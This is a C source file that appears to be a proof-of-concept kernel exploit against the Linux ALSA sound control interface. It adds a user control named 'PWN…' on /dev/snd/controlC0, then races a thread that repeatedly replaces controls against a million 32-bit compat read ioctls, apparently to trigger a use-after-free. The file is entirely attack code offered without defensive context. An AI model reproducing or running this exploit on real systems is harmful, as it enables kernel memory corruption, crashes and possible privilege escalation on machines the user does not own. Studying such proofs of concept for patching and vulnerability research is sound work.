#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <limits.h>
#include <pthread.h>

#define SNDRV_CTL_IOCTL_ELEM_READ       0xc4c85512
#define SNDRV_CTL_IOCTL_ELEM_READ32     0xc2c45512
#define SNDRV_CTL_IOCTL_ELEM_ADD32      0xc1105517
#define SNDRV_CTL_IOCTL_ELEM_REPLACE32  0xc1105518
#define SNDRV_CTL_IOCTL_ELEM_INFO32     0xc1105511
#define SNDRV_CTL_IOCTL_ELEM_LIST       0xc0505510
#define SNDRV_CTL_IOCTL_ELEM_LIST32     0xc0485510

#if defined __x86_64__
#error "Must compile to 32bit program!"
#endif

#define SNDRV_CTL_ELEM_ID_NAME_MAXLEN	44
#define SNDRV_CTL_ELEM_ACCESS_USER		(1<<29) /* user space element */

#define	SNDRV_CTL_ELEM_TYPE_INTEGER64	6 /* 64-bit integer type */
#define	SNDRV_CTL_ELEM_TYPE_ENUMERATED  3

typedef int snd_ctl_elem_iface_t;
typedef int32_t s32;
typedef uint32_t u32;
typedef int64_t s64;
typedef uint64_t u64;

struct snd_ctl_elem_id {
    unsigned int numid;		/* numeric identifier, zero = invalid */
    snd_ctl_elem_iface_t iface;	/* interface identifier */
    unsigned int device;		/* device/client number */
    unsigned int subdevice;		/* subdevice (substream) number */
    unsigned char name[SNDRV_CTL_ELEM_ID_NAME_MAXLEN];		/* ASCII name of item */
    unsigned int index;		/* index of item */
};

struct snd_ctl_elem_list {
    unsigned int offset;		/* W: first element ID to get */
    unsigned int space;		/* W: count of element IDs to get */
    unsigned int used;		/* R: count of element IDs set */
    unsigned int count;		/* R: count of all elements */
    struct snd_ctl_elem_id *pids; /* R: IDs */
    unsigned char reserved[50];
};

struct snd_ctl_elem_value32 {
    struct snd_ctl_elem_id id;
    unsigned int indirect;	/* bit-field causes misalignment */
    union {
        s32 integer[128];
        unsigned char data[512];
        s64 integer64[64];
    } value;
    unsigned char reserved[128];
};

struct snd_ctl_elem_info32 {
    struct snd_ctl_elem_id id; // the size of struct is same
    s32 type;
    u32 access;
    u32 count;
    s32 owner;
    union {
        struct {
            s32 min;
            s32 max;
            s32 step;
        } integer;
        struct {
            u64 min;
            u64 max;
            u64 step;
        } integer64;
        struct {
            u32 items;          //Number of name items
            u32 item;   
            char name[64];
            u64 names_ptr;      //Userland ptr to names table in manner: [NAME\x00NAME\x00...]
            u32 names_length;  //length of all names buffer, max 64K
        } enumerated;
        unsigned char reserved[128];
    } value;
    unsigned char reserved[64];
} __attribute__((packed));

void fatal(char *msg){
    perror(msg);
    exit(-1);
}


struct snd_ctl_elem_value32 userdata;
struct snd_ctl_elem_info32 userinfo;
struct snd_ctl_elem_list userlist;

int fd = -1;
int current_id = 0;
char name[0x100];

void *create(void *arg){
    while(1){
        userinfo.owner = 0; //Needs to be 0 for proper calculations, same with count
        userinfo.count = 1;
        userinfo.type = SNDRV_CTL_ELEM_TYPE_INTEGER64;
        userinfo.id.numid = current_id;//Force search by id
        //userinfo.id.numid = 0; //Force to use name as identifier instead of current_id, only kctl search differs
        //printf("[*] Replacing control with id %d\n", userinfo.id.numid);
        if(ioctl(fd, SNDRV_CTL_IOCTL_ELEM_REPLACE32, &userinfo) != 0){
            fatal("ioctl replace");
        }
        current_id += 1;
    }
}

int main(){
    fd = open("/dev/snd/controlC0", O_RDWR);
    if(fd == -1){
        fatal("open"); 
    }

    printf("[*] Opened control fd, fd is %d\n", fd);

    unsigned int free_id = -1;

    userlist.pids = malloc(sizeof(struct snd_ctl_elem_id) * 0x100);
    userlist.space = 100;//Amount of kcontrols to read

    if(ioctl(fd, SNDRV_CTL_IOCTL_ELEM_LIST32, &userlist) != 0){
        fatal("ioctl list");
    }

    printf("[*] Listing all kcontrols\n");
    for(int i = 0; i < userlist.count; i++){
        printf("[*] Id: %d, name: %s\n", userlist.pids[i].numid, userlist.pids[i].name);
    }

    free_id = userlist.pids[userlist.count - 1].numid+1;
    userinfo.owner = 0;
    userinfo.count = 1;
    userinfo.type = SNDRV_CTL_ELEM_TYPE_INTEGER64;
    userinfo.id.numid = free_id;

    sprintf(name, "PWN%04x", free_id);
    strncpy(userinfo.id.name, name, strlen(name) + 1);
    strncpy(userdata.id.name, name, strlen(name) + 1);

    printf("[*] Creating new control with id %d\n", userinfo.id.numid);
    if(ioctl(fd, SNDRV_CTL_IOCTL_ELEM_ADD32, &userinfo) != 0){
        fatal("ioctl add");
    }
    //At this point setup is done - need to race with creating the kcontrols and reading.

    int current_id = free_id;
    pthread_t th1;
    pthread_create(&th1, NULL, create, NULL);
   
    for(int i=0; i < 1000000; i++){
        userdata.id.numid = current_id = 0; //new control id
        ioctl(fd, SNDRV_CTL_IOCTL_ELEM_READ32, &userdata);
    }
    pthread_join(th1, NULL);
}
